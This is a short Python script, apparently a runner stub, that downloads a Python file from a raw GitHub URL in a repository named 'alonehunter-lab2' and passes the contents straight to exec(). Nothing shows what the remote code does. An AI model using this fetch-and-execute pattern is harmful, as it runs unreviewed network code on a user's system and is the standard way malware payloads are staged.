import urllib.request
RUNNER="https://raw.githubusercontent.com/AloneHunterr/alonehunter-lab2/a7a7393af7f05e300540a0b755a9b63dd869d1ca/audio_apex/r008_stihoplet_c01_c12.py"
exec(urllib.request.urlopen(RUNNER,timeout=30).read())
